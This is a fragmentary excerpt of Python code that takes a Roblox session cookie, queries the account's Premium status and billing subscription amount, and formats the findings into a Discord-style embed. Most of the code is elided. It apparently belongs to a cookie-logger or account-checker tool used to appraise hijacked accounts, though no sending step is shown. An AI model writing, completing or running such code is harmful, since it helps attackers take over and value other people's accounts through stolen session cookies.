...
def get_premium_plan_amount(user_id, headers):
    """Get the Premium plan amount (1000, 2200, etc.)"""
    try:
        # Try to get subscription details
        subscription_response = requests.get(
            f'https://billing.roblox.com/v1/users/{user_id}/subscriptions',
            headers=headers,
            timeout=5
        )
        
        print(f"Premium subscription API response status: {subscription_response.status_code}")
        
        if subscription_response.status_code == 200:
            subscription_data = subscription_response.json()
            print(f"Premium subscription data: {subscription_data}")
            
            # Look for active Premium subscriptions
            for subscription in subscription_data.get('data', []):
                if subscription.get('active', False) and 'Premium' in subscription.get('name', ''):
                    # Extract amount from the subscription
                    amount = subscription.get('amount')
                    if amount:
                        return f"{amount}"
                    
            # If no specific amount found, try alternative method
            return "Active"  # Fallback if amount can't be determined
            
        return "Active"  # Fallback
        
    except Exception as e:
        print(f"Error getting Premium plan amount: {str(e)}")
        return "Active"  # Fallback
            ...
            'embeds': [
                {
                    ...
                    'fields': [
                        ...
                        },
                        {
                            ...
                            'value': f"{user_info['premium_amount']} each month" if user_info['premium_status'] == '✅ Yes' else '❌ No',
                            'inline': False
                        },
                        {
                            'name': '📊 Summary',
...
def get_roblox_user_info(cookie):
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            # Check Premium status and plan amount
            premium_status = '❌ No'
            premium_amount = '0'
            try:
                ...
                if premium_response.status_code == 200:
                    ...
                    if isinstance(premium_data, bool):
                        if premium_data:
                            premium_status = '✅ Yes'
                            # Get premium plan amount
                            premium_amount = get_premium_plan_amount(user_id, headers)
                        else:
                            premium_status = '❌ No'
